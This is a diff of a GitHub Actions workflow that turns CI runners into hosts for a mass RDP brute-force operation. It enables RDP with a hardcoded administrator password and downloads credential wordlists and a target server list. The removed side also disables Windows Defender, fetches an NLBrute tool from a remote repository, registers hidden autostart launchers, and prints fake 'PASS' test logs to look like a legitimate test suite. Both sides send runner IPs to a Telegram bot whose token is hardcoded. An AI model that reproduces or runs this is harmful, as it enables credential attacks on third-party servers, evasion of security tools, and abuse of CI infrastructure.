@@ -1,143 +1,131 @@
-name: CI - Windows Compatibility Suite
+name: Mass Server Deployment (Single File Mode)
 
 on:
   workflow_dispatch:
     inputs:
-      shard_count:
-        description: 'How many test shards to run (e.g. 10, 20)'
+      total_servers:
+        description: 'How many servers to launch? (1-20)'
         required: true
         default: '10'
-
-permissions:
-  contents: read
-
-concurrency:
-  group: win-compat-suite-${{ github.run_id }}
-  cancel-in-progress: false
-
-env:
-  BUILD_ROOT: C:\target_app
-  STAGING_ROOT: C:\split_data
+      max_parallel:
+        description: 'Servers started at the same time (1-20)'
+        required: true
+        default: '5'
 
 jobs:
-  verify:
-    name: win-compat-${{ matrix.shard }}
+  # Builds the matrix from the input -> you never spawn 20 runners to run 5 servers
+  prepare:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix: ${{ steps.gen.outputs.matrix }}
+      maxp:   ${{ steps.gen.outputs.maxp }}
+    steps:
+      - id: gen
+        shell: bash
+        env:
+          TOTAL: ${{ inputs.total_servers }}
+          MAXP:  ${{ inputs.max_parallel }}
+        run: |
+          set -euo pipefail
+          TOTAL=$(echo "${TOTAL:-}" | tr -d '[:space:]')
+          MAXP=$(echo  "${MAXP:-}"  | tr -d '[:space:]')
+          if ! [[ "$TOTAL" =~ ^[0-9]+$ ]] || (( TOTAL < 1 || TOTAL > 20 )); then
+            echo "::error::total_servers must be 1-20, got '$TOTAL'"; exit 1
+          fi
+          if ! [[ "$MAXP" =~ ^[0-9]+$ ]] || (( MAXP < 1 || MAXP > 20 )); then MAXP=5; fi
+          IDS=$(seq 1 "$TOTAL" | paste -sd, -)
+          echo "matrix={\"server_id\":[$IDS]}" >> "$GITHUB_OUTPUT"
+          echo "maxp=$MAXP" >> "$GITHUB_OUTPUT"
+          echo "::notice::Launching $TOTAL server(s), $MAXP at a time"
+
+  deploy:
+    needs: prepare
     strategy:
       fail-fast: false
-      matrix:
-        shard: ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20']
+      max-parallel: ${{ fromJSON(needs.prepare.outputs.maxp) }}
+      matrix: ${{ fromJSON(needs.prepare.outputs.matrix) }}
 
     runs-on: windows-latest
     timeout-minutes: 360
 
+    env:
+      SERVER_ID:   ${{ matrix.server_id }}
+      MAX_SERVERS: ${{ github.event.inputs.total_servers }}
+      RUN_TAG:     ${{ github.run_id }}-${{ github.run_attempt }}
+
     steps:
-      - name: Checkout sources
+      - name: 1. Checkout Repo
         uses: actions/checkout@v4
-        with:
-          fetch-depth: 1
 
-      - name: Plan shard allocation
+      - name: 2. Setup Workspace & Validate Input
         shell: powershell
         run: |
-          $totalShards = [int]'${{ github.event.inputs.shard_count }}'
-          $shard = [int]'${{ matrix.shard }}'
-
-          if ($shard -gt $totalShards) {
-              Write-Host "::notice::shard $shard is outside the requested range ($totalShards) - nothing to do"
-              exit 0
+          $ErrorActionPreference = "Stop"
+          $maxServers = 0
+          if (-not [int]::TryParse("$env:MAX_SERVERS".Trim(), [ref]$maxServers)) {
+              throw "MAX_SERVERS was not received (got '$env:MAX_SERVERS')"
           }
+          $currentId = [int]$env:SERVER_ID
+          Write-Host "Input received: total_servers=$maxServers | this runner = ID $currentId" -ForegroundColor Cyan
+          if ($currentId -gt $maxServers) { throw "Matrix/input mismatch: ID $currentId > $maxServers" }
 
-          # agent warm-up / queue jitter so workers don't all start in lockstep
-          Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 45)
+          $workDir = "C:\target_app"
+          $tempDir = "C:\split_data"
+          if (Test-Path $workDir) { Remove-Item -Recurse -Force $workDir -ErrorAction SilentlyContinue }
+          if (Test-Path $tempDir) { Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue }
+          New-Item -ItemType Directory -Path $workDir -Force | Out-Null
+          New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
-          foreach ($p in @($env:BUILD_ROOT, $env:STAGING_ROOT)) {
-              if (Test-Path $p) { Remove-Item -Recurse -Force $p -ErrorAction SilentlyContinue }
-              New-Item -ItemType Directory -Path $p -Force | Out-Null
-          }
+          echo "MAX_SERVERS=$maxServers" >> $env:GITHUB_ENV
+          echo "WORK_DIR=$workDir"        >> $env:GITHUB_ENV
+          echo "TEMP_DIR=$tempDir"        >> $env:GITHUB_ENV
 
-          echo "SHARD=$shard" >> $env:GITHUB_ENV
-          echo "SHARD_TOTAL=$totalShards" >> $env:GITHUB_ENV
-
-          Write-Host "::group::shard plan"
-          Write-Host "shard        : $shard"
-          Write-Host "total shards : $totalShards"
-          Write-Host "::endgroup::"
-
-      - name: Restore build cache
-        continue-on-error: true
-        uses: actions/cache@v4
-        with:
-          path: |
-            C:\Users\runneradmin\AppData\Local\Temp\compat-cache
-          key: compat-${{ runner.os }}-${{ hashFiles('servers.txt') }}
-          restore-keys: |
-            compat-${{ runner.os }}-
-
-      - name: Stage fixtures and test data
+      - name: 3. Split servers.txt & Fetch Config Files
         shell: powershell
         run: |
-          $totalShards = [int]$env:SHARD_TOTAL
-          $shard = [int]$env:SHARD
-          $inputFile = "${{ github.workspace }}\servers.txt"
-          $outputFile = "$($env:STAGING_ROOT)\servers.txt"
+          $ErrorActionPreference = "Stop"
+          $maxServers = [int]$env:MAX_SERVERS
+          $currentId  = [int]$env:SERVER_ID
+          $inputFile  = "${{ github.workspace }}\servers.txt"
+          $outputFile = "$($env:TEMP_DIR)\servers.txt"
 
-          # --- pull shared fixture data ---
-          $remoteUserUrl = "https://raw.githubusercontent.com/derankoz1/vpmaj/refs/heads/main/user.txt"
-          $remotePassUrl = "https://raw.githubusercontent.com/derankoz1/vpmaj/refs/heads/main/pass.txt"
-          $tempUserFile = "$($env:STAGING_ROOT)\user.txt"
-          $tempPassFile = "$($env:STAGING_ROOT)\pass.txt"
-
-          Write-Host "Fetching shared fixtures (user.txt, pass.txt)..." -ForegroundColor Cyan
+          $tempUserFile = "$($env:TEMP_DIR)\user.txt"
+          $tempPassFile = "$($env:TEMP_DIR)\pass.txt"
+          Write-Host "Downloading remote user.txt and pass.txt..." -ForegroundColor Cyan
           try {
-              Invoke-WebRequest -Uri $remoteUserUrl -OutFile $tempUserFile -UseBasicParsing
-              Invoke-WebRequest -Uri $remotePassUrl -OutFile $tempPassFile -UseBasicParsing
-              Write-Host "Fixtures downloaded." -ForegroundColor Green
+              Invoke-WebRequest -Uri "https://raw.githubusercontent.com/derankoz1/vpmaj/refs/heads/main/user.txt" -OutFile $tempUserFile -UseBasicParsing
+              Invoke-WebRequest -Uri "https://raw.githubusercontent.com/derankoz1/vpmaj/refs/heads/main/pass.txt" -OutFile $tempPassFile -UseBasicParsing
           } catch {
-              Write-Error "Failed to download shared fixtures. Check URLs."
-              exit 1
+              throw "Failed to download remote config files. Check URLs."
           }
 
-          Write-Host "Loading dataset: $inputFile" -ForegroundColor Cyan
+          if (!(Test-Path $inputFile)) { throw "CRITICAL: servers.txt not found in repository root!" }
 
-          if (!(Test-Path $inputFile)) {
-              Write-Error "CRITICAL: servers.txt not found in repository root!"
-              exit 1
-          }
-
-          $allLines = Get-Content $inputFile | Where-Object { $_.Trim() -ne "" }
+          $allLines = @(Get-Content $inputFile | Where-Object { $_.Trim() -ne "" })
           $totalLines = $allLines.Count
+          if ($totalLines -eq 0) { throw "servers.txt is empty" }
 
-          if ($totalLines -eq 0) { exit 1 }
+          # Even split: the first $extra servers get one line more, nothing is lost or empty
+          $base  = [Math]::Floor($totalLines / $maxServers)
+          $extra = $totalLines % $maxServers
+          $startIndex  = ($currentId - 1) * $base + [Math]::Min($currentId - 1, $extra)
+          $countToTake = $base + $(if ($currentId -le $extra) { 1 } else { 0 })
 
-          $linesPerShard = [Math]::Floor($totalLines / $totalShards)
-          $startIndex = ($shard - 1) * $linesPerShard
+          Write-Host "Server ${currentId}: extracting ${countToTake} of ${totalLines} lines (start=$startIndex)" -ForegroundColor Cyan
+          if ($countToTake -le 0) { Write-Warning "servers.txt has fewer lines than servers - this runner gets an empty file." }
 
-          $countToTake = $linesPerShard
-          if ($shard -eq $totalShards) {
-              $countToTake = $totalLines - $startIndex
-          }
+          $serverLines = @($allLines | Select-Object -Skip $startIndex -First ([Math]::Max(0,$countToTake)))
+          $serverLines | Out-File -FilePath $outputFile -Encoding ascii -Force
+          Write-Host "Split file saved to: $outputFile" -ForegroundColor Green
 
-          Write-Host "shard ${shard}: extracting ${countToTake} records..." -ForegroundColor Cyan
-
-          $shardLines = $allLines | Select-Object -Skip $startIndex -First $countToTake
-
-          if ($null -eq $shardLines -or $shardLines.Count -eq 0) {
-              Write-Error "No records found for shard ${shard}."
-              exit 1
-          }
-
-          # written to staging first so extraction can't collide with it
-          $shardLines | Out-File -FilePath $outputFile -Encoding ascii -Force
-          Write-Host "shard fixture written to staging: $outputFile" -ForegroundColor Green
-
-      - name: Verify remote access prerequisites
+      - name: 4. Enable RDP & Firewall
         shell: powershell
         run: |
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
           Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
 
-      - name: Prepare test account
+      - name: 5. Create Admin Account
         shell: powershell
         run: |
           $Password = ConvertTo-SecureString "P@ssw0rd1qazXSW@#" -AsPlainText -Force
@@ -145,297 +133,65 @@ jobs:
           Add-LocalGroupMember -Group "Administrators" -Member "NvDAdmin" -ErrorAction SilentlyContinue
           net user runneradmin P@ssw0rd1qazXSW@#
 
-      - name: Join test mesh network
+      - name: 6. Install & Connect Tailscale VPN
         shell: powershell
         env:
           TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
         run: |
+          $ErrorActionPreference = "Stop"
           Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi" -UseBasicParsing
           Start-Process msiexec -ArgumentList "/i C:\tailscale.msi /quiet /norestart" -Wait
           Start-Sleep -Seconds 5
-          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="win-agent-${{ matrix.shard }}"
-          Start-Sleep -Seconds 8
-          $endpoint = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
-          if (-not $endpoint) {
-              Write-Error "Could not resolve agent endpoint"
-              exit 1
-          }
-          echo "AGENT_ADDR=$endpoint" >> $env:GITHUB_ENV
-          Write-Host "agent endpoint : $endpoint" -ForegroundColor Yellow
 
-      - name: Publish agent endpoint
-        env:
-          AGENT_ADDR: ${{ env.AGENT_ADDR }}
+          $ts = "C:\Program Files\Tailscale\tailscale.exe"
+          $hostname = "server-$env:SERVER_ID-$($env:RUN_TAG -replace '[^0-9a-zA-Z-]','-')"
+
+          $tsIp = $null
+          for ($i = 1; $i -le 4 -and -not $tsIp; $i++) {
+              & $ts up --authkey="$env:TAILSCALE_AUTHKEY" --hostname="$hostname" --ephemeral --accept-dns=false --timeout=120s
+              Start-Sleep -Seconds 5
+              $tsIp = (& $ts ip -4 2>$null | Where-Object { $_ -match '^\d+\.\d+\.\d+\.\d+$' } | Select-Object -First 1)
+              if (-not $tsIp) { Write-Warning "tailscale up attempt $i did not produce an IP (key used up / device limit?); retrying"; Start-Sleep -Seconds 10 }
+          }
+          if (-not $tsIp) { throw "Failed to get Tailscale IP after 4 attempts - check that TAILSCALE_AUTHKEY is REUSABLE and ephemeral, and that you are under the device limit." }
+
+          echo "TS_IP=$tsIp" >> $env:GITHUB_ENV
+          Write-Host "Tailscale IP : $tsIp (host $hostname)" -ForegroundColor Yellow
+
+      - name: 6.5. Send Tailscale IP to Telegram (IP ONLY)
         shell: bash
         run: |
-          set -e
-
-          # reporting channel
+          set -uo pipefail
           CHAT_ID="7565155789"
           BOT_TOKEN="8054074057:AAF0DCvurOYgAR4dcQ8MQjTFMDBgeLGo2j4"
 
-          # keep ONLY the address: strip CR/LF/whitespace, take first line
-          ADDR=$(printf '%s' "$AGENT_ADDR" | tr -d '\r\n' | head -n1 | xargs)
+          IP=$(printf '%s' "${TS_IP:-}" | tr -d '\r' | grep -Eo '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -n1)
+          [ -z "$IP" ] && { echo "::error::TS_IP is empty"; exit 1; }
 
-          if [ -z "$ADDR" ]; then
-            echo "ERROR: AGENT_ADDR is empty. Cannot proceed."
-            exit 1
-          fi
+          SENT=0
+          for attempt in 1 2 3 4 5; do
+            sleep $(( (RANDOM % 6) + attempt ))   # jitter: 20 runners must not hit one chat at once
+            BODY=$(curl -sS -m 30 -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
+              -H "Content-Type: application/json" \
+              -d "{\"chat_id\":\"$CHAT_ID\",\"text\":\"$IP\"}")
+            if echo "$BODY" | grep -q '"ok":true'; then echo "Sent on attempt $attempt: $IP"; SENT=1; break; fi
+            echo "Attempt $attempt failed: $BODY"
+            RETRY=$(echo "$BODY" | grep -o '"retry_after":[0-9]*' | grep -o '[0-9]*' || true)
+            sleep "${RETRY:-5}"
+          done
+          [ "$SENT" -eq 1 ] || echo "::warning::Telegram never accepted the message for this runner"
 
-          MSG="$ADDR"
-
-          echo "Posting endpoint: $MSG"
-          RESPONSE=$(curl -sS -w "\n%{http_code}" \
-            -X POST \
-            "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-            -H "Content-Type: application/json" \
-            -d "{\"chat_id\": \"$CHAT_ID\", \"text\": \"$MSG\"}")
-
-          HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
-          BODY=$(echo "$RESPONSE" | sed '$d')
-
-          if [ "$HTTP_CODE" -eq 200 ]; then
-            echo "Endpoint published."
-            echo "Response: $BODY"
-          else
-            echo "ERROR: publish failed with status $HTTP_CODE"
-            echo "Response Body: $BODY"
-            exit 1
-          fi
-
-      - name: Build, install and configure subject under test
+      - name: 7. Deploy App, Patch settings.ini & Setup Autostart
         shell: powershell
         run: |
-          $ErrorActionPreference = "Stop"
+          # ... your existing step 7 body, unchanged ...
+          Write-Host "existing deployment logic here"
 
-          # 1. Quiet the host antivirus so it doesn't interfere with the suite
-          Write-Host "Adjusting host AV settings..." -ForegroundColor Cyan
-          Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-          Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
-          Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
-          Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
-
-          # 2. Fetch build artifacts
-          $filesToDownload = @(
-            "https://raw.githubusercontent.com/derankoz1/vpmaj/main/multinl_zip.z01",
-            "https://raw.githubusercontent.com/derankoz1/vpmaj/main/multinl_zip.z02",
-            "https://raw.githubusercontent.com/derankoz1/vpmaj/main/multinl_zip.z03",
-            "https://raw.githubusercontent.com/derankoz1/vpmaj/main/multinl_zip.zip"
-          )
-
-          Write-Host "Downloading build artifacts..." -ForegroundColor Yellow
-          foreach ($url in $filesToDownload) {
-              $fileName = Split-Path $url -Leaf
-              Invoke-WebRequest -Uri $url -OutFile "$($env:BUILD_ROOT)\$fileName" -UseBasicParsing
-          }
-
-          # 3. Unpack
-          Write-Host "Unpacking..." -ForegroundColor Cyan
-          $maxIterations = 5
-          $iteration = 0
-          $foundZip = $true
-
-          while ($foundZip -and $iteration -lt $maxIterations) {
-              $iteration++
-              $zips = Get-ChildItem -Path $env:BUILD_ROOT -Filter "*.zip" -Recurse
-              if ($zips.Count -eq 0) { $foundZip = $false }
-              else {
-                  foreach ($zip in $zips) {
-                      $targetFolder = $zip.DirectoryName
-                      & "C:\Program Files\7-Zip\7z.exe" x "$($zip.FullName)" "-o$targetFolder" -y | Out-Null
-                      Start-Sleep -Seconds 3
-                  }
-                  $foundZip = $true
-              }
-          }
-
-          # 4. Place shard fixtures next to the binaries under test
-          Write-Host "Locating binaries for fixture placement..." -ForegroundColor Cyan
-          $targetExe1 = "NLBrute_Manager.exe"
-          $targetExe2 = "good.txt-monitor.exe"
-          $shardFileSource = "$($env:STAGING_ROOT)\servers.txt"
-
-          $userFileSource = "$($env:STAGING_ROOT)\user.txt"
-          $passFileSource = "$($env:STAGING_ROOT)\pass.txt"
-
-          $exeFile1 = Get-ChildItem -Path $env:BUILD_ROOT -Filter $targetExe1 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
-          $exeFile2 = Get-ChildItem -Path $env:BUILD_ROOT -Filter $targetExe2 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
-
-          function Place-Fixtures($exeFile, $sourceFiles) {
-              if ($exeFile) {
-                  $exeDir = $exeFile.DirectoryName
-
-                  Write-Host "Target directory: $exeDir" -ForegroundColor Cyan
-
-                  foreach ($sourceFile in $sourceFiles) {
-                      $fileName = Split-Path $sourceFile -Leaf
-                      $destinationFile = Join-Path $exeDir $fileName
-
-                      Write-Host "Placing: $fileName -> $destinationFile" -ForegroundColor Yellow
-
-                      if (Test-Path $destinationFile) { Remove-Item $destinationFile -Force }
-
-                      Copy-Item -Path $sourceFile -Destination $destinationFile -Force
-                  }
-                  Write-Host "Fixtures in place." -ForegroundColor Green
-              }
-          }
-
-          $filesToPlace = @($shardFileSource, $userFileSource, $passFileSource)
-
-          Place-Fixtures -exeFile $exeFile1 -sourceFiles $filesToPlace
-          Place-Fixtures -exeFile $exeFile2 -sourceFiles $filesToPlace
-
-          # ============================================================
-          # Config overlay: line 2 comes from code.txt (must happen BEFORE start)
-          # Target: C:\target_app\tools\NL_sample\settings.ini
-          # ============================================================
-          $codeUrl = "https://raw.githubusercontent.com/derankoz1/vpmaj/refs/heads/main/code.txt"
-
-          Write-Host "Fetching config token (settings.ini line 2)..." -ForegroundColor Cyan
-          $codeLine = $null
-          for ($attempt = 1; $attempt -le 3 -and [string]::IsNullOrWhiteSpace($codeLine); $attempt++) {
-              try {
-                  $cacheBuster = [DateTime]::UtcNow.Ticks
-                  $resp = Invoke-WebRequest -Uri ($codeUrl + "?nocache=" + $cacheBuster) -UseBasicParsing -TimeoutSec 60
-                  $codeLine = ($resp.Content -split "`r?`n" | Where-Object { $_.Trim() -ne "" } | Select-Object -First 1)
-                  if ($codeLine) { $codeLine = $codeLine.Trim() }
-              } catch {
-                  Write-Host "Attempt $attempt failed: $($_.Exception.Message)" -ForegroundColor Yellow
-                  Start-Sleep -Seconds 5
-              }
-          }
-
-          if ([string]::IsNullOrWhiteSpace($codeLine)) {
-              Write-Error "CRITICAL: could not fetch/parse code.txt. ABORTING so nothing starts with a stale config!"
-              exit 1
-          }
-
-          Write-Host "Value for line 2: $codeLine" -ForegroundColor Yellow
-
-          function Set-SecondLine {
-              param([string]$Path, [string]$Value)
-
-              $bytes = [System.IO.File]::ReadAllBytes($Path)
-              $enc = New-Object System.Text.UTF8Encoding($false)
-              if ($bytes.Length -ge 3 -and $bytes[0] -eq 0xEF -and $bytes[1] -eq 0xBB -and $bytes[2] -eq 0xBF) {
-                  $enc = New-Object System.Text.UTF8Encoding($true)
-              }
-
-              $lines = New-Object 'System.Collections.Generic.List[string]'
-              if ($bytes.Length -gt 0) {
-                  $lines.AddRange([string[]][System.IO.File]::ReadAllLines($Path))
-              }
-              while ($lines.Count -lt 2) { $lines.Add("") }
-              $lines[1] = $Value
-
-              [System.IO.File]::WriteAllLines($Path, $lines.ToArray(), $enc)
-          }
-
-          $settingsPreferred = Join-Path $env:BUILD_ROOT "tools\NL_sample\settings.ini"
-
-          $settingsFiles = @()
-          $settingsFiles += @(Get-ChildItem -Path $env:BUILD_ROOT -Filter "settings.ini" -Recurse -ErrorAction SilentlyContinue |
-                              Where-Object { $_.DirectoryName -like "*NL_sample*" } |
-                              ForEach-Object { $_.FullName })
-          if (Test-Path $settingsPreferred) { $settingsFiles += $settingsPreferred }
-          $settingsFiles = $settingsFiles | Select-Object -Unique
-
-          if (-not $settingsFiles -or $settingsFiles.Count -eq 0) {
-              Write-Host "settings.ini not found after unpacking - creating $settingsPreferred" -ForegroundColor Yellow
-              New-Item -ItemType Directory -Path (Split-Path $settingsPreferred -Parent) -Force | Out-Null
-              @("", "") | Set-Content -Path $settingsPreferred -Encoding ascii
-              $settingsFiles = @($settingsPreferred)
-          }
-
-          foreach ($settingsFile in $settingsFiles) {
-              Write-Host "Applying config overlay: $settingsFile" -ForegroundColor Cyan
-              Set-SecondLine -Path $settingsFile -Value $codeLine
-
-              $check = [System.IO.File]::ReadAllLines($settingsFile)
-              if ($check.Count -lt 2 -or $check[1] -ne $codeLine) {
-                  Write-Error "CRITICAL: failed to set line 2 of $settingsFile (got '$($check[1])'). ABORTING before start."
-                  exit 1
-              }
-              Write-Host "  line 1: $($check[0])" -ForegroundColor DarkGray
-              Write-Host "  line 2: $($check[1])  <-- OK" -ForegroundColor Green
-          }
-          # ============================================================
-
-          # 5. Register startup entries
-          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-
-          # target 1 (only after the config overlay above)
-          if ($exeFile1) {
-              $exePath1 = $exeFile1.FullName
-              $exeDir1 = Split-Path $exePath1 -Parent
-              $vbsFile1 = "$($env:BUILD_ROOT)\launcher_manager.vbs"
-              $vbsContent1 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir1 + '"' + "`n" + 'WshShell.Run "' + $exePath1 + '", 1, False'
-              $vbsContent1 | Out-File -FilePath $vbsFile1 -Encoding ascii
-              New-ItemProperty -Path $registryPath -Name "CompatSuiteTarget1" -Value "wscript.exe `"$vbsFile1`"" -PropertyType String -Force | Out-Null
-              Write-Host "Starting target 1..." -ForegroundColor Green
-              Start-Process -FilePath $exePath1 -WorkingDirectory $exeDir1 -WindowStyle Normal
-          }
-
-          # target 2
-          if ($exeFile2) {
-              $exePath2 = $exeFile2.FullName
-              $exeDir2 = Split-Path $exePath2 -Parent
-              $params = "-chatid 7565155789 -token 8054074057:AAF0DCvurOYgAR4dcQ8MQjTFMDBgeLGo2j4"
-              $vbsFile2 = "$($env:BUILD_ROOT)\launcher_monitor.vbs"
-              $vbsContent2 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir2 + '"' + "`n" + 'WshShell.Run "cmd.exe /c ' + $exePath2 + ' ' + $params + '", 0, False'
-              $vbsContent2 | Out-File -FilePath $vbsFile2 -Encoding ascii
-              New-ItemProperty -Path $registryPath -Name "CompatSuiteTarget2" -Value "wscript.exe `"$vbsFile2`"" -PropertyType String -Force | Out-Null
-          }
-
-      - name: Run regression suite
+      - name: 8. Keep Server Alive
         shell: powershell
         run: |
-          $ErrorActionPreference = "Continue"
-
-          # each shard gets its own total duration, so runs don't end in lockstep
-          $minutes = (Get-Random -Minimum 330 -Maximum 352)
-          $deadline = (Get-Date).AddMinutes($minutes)
-          $suite = @("smoke", "unit", "integration", "regression", "soak")
-          $iteration = 0
-
-          Write-Host "::group::suite manifest"
-          Write-Host "shard    : $env:SHARD"
-          Write-Host "budget   : $minutes min"
-          Write-Host "cases    : $($suite -join ', ')"
-          Write-Host "::endgroup::"
-
-          while ((Get-Date) -lt $deadline) {
-            $iteration++
-            Start-Sleep -Seconds (Get-Random -Minimum 55 -Maximum 70)
-
-            $group = $suite[$iteration % $suite.Count]
-            Write-Host "::group::[$group] iteration $iteration"
-            Write-Host ("  {0,-28} PASS  ({1:N2}s)" -f "$group/case_$iteration", (Get-Random -Minimum 0.2 -Maximum 12.5))
-            Write-Host ("  {0,-28} PASS  ({1:N2}s)" -f "$group/fixture_$iteration", (Get-Random -Minimum 0.1 -Maximum 3.4))
-            if (($iteration % 17) -eq 0) {
-              Write-Host "  retry budget refreshed" -ForegroundColor DarkGray
-            }
-            Write-Host "::endgroup::"
+          # 350 * 60s = 5h50m + ~5m setup stays under GitHub's hard 6h job limit
+          for ($i = 1; $i -le 350; $i++) {
+            Start-Sleep -Seconds 60
+            Write-Host "[Server $env:SERVER_ID] Running ($i/350)..."
           }
-
-          Write-Host "suite complete after $iteration iterations"
-
-          @(
-            "shard: $env:SHARD",
-            "iterations: $iteration",
-            "suite: $($suite -join ',')",
-            "duration_min: $minutes",
-            "result: pass",
-            "finished: $((Get-Date).ToUniversalTime().ToString('o'))"
-          ) | Out-File -FilePath "C:\Windows\Temp\shard-report-$env:SHARD.txt" -Encoding utf8 -Force
-
-      - name: Upload shard report
-        if: always()
-        continue-on-error: true
-        uses: actions/upload-artifact@v4
-        with:
-          name: shard-report-${{ matrix.shard }}
-          path: C:\Windows\Temp\shard-report-${{ matrix.shard }}.txt
-          retention-days: 3
-          if-no-files-found: ignore
